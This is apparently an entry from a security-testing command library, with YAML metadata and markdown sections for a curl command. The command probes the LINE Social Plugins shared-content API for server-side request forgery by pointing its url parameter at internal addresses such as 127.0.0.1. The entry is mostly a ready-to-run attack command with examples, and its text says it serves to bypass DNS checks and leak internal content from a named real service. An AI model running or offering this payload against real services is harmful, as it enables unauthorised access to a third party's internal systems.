---
data: >-
  curl -X GET "https://social-plugins.line.me/api/shared-content?url=$URL" -H
  "User-Agent: Mozilla/5.0 (compatible; SSRF Test)" -v
tags:
  - ssrf
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d4d854e3-376b-4e56-a58a-dfbc65376bed
created_at: '2025-12-14T04:08:48.513Z'
updated_at: '2025-12-14T04:08:48.513Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-bypass-test

## Command

```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=$URL" -H "User-Agent: Mozilla/5.0 (compatible; SSRF Test)" -v
```

## Description

This command uses curl to test for SSRF in the LINE Social Plugins service by sending a GET request with a manipulated URL parameter. Replace $URL with the target (e.g., http://127.0.0.1:8080/internal) to bypass DNS checks and fetch internal content. Use it during web vulnerability assessment to exploit public-facing endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `url=$URL` | The vulnerable parameter with payload (e.g., internal URL) | Yes |
| `-H "User-Agent: ..."` | Custom header to mimic browser requests | No |
| `-v` | Verbose output for debugging requests/responses | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=https://example.com" -H "User-Agent: Mozilla/5.0"
```

### Advanced Usage

```bash
curl -X GET "https://social-plugins.line.me/api/shared-content?url=http://127.0.0.1:80/internal.html" -H "User-Agent: Mozilla/5.0 (compatible; SSRF Test)" -v | head -20
```

## Expected Output

Successful execution returns HTTP response details, including status code 200 and body containing either external page metadata or leaked internal HTML content (e.g., <html> tags from internal services). Verbose mode shows request headers and any DNS-related errors (absence indicates bypass success).

## Related

- [[Related Procedure]]
